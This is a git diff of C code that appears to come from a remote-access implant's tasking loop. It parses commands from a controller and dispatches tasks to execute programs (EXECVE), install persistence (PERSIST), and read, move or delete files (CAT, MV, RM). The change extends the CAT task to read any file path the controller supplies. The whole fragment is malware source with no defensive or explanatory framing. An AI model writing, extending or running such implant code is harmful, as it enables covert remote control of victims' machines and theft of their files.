@@ -115,14 +115,13 @@ void check_commands() {
         return;
     }
     
-    // Format attendu: "type,id_task,command,argument"
     char* type = strtok(result, ",");
     
     if (type != NULL) {
         char* id_task = strtok(NULL, ",");
         if (strcmp(type, "EXECVE") == 0) {
             char* command = strtok(NULL, ",");
-            char* argument = strtok(NULL, ",");  // Get the argument as well
+            char* argument = strtok(NULL, ",");  
             task_execve(command, argument, id_task);
         } else if (strcmp(type, "SLEEP") == 0) {
             char* sleep_time_str = strtok(NULL, ",");
@@ -135,7 +134,8 @@ void check_commands() {
         } else if (strcmp(type, "PERSIST") == 0) {
             task_persist();
         } else if (strcmp(type, "CAT") == 0) {
-            task_cat();
+            char* file_path = strtok(NULL, ","); 
+            task_cat(file_path, id_task);
         } else if (strcmp(type, "MV") == 0) {
             task_mv();
         } else if (strcmp(type, "RM") == 0) {
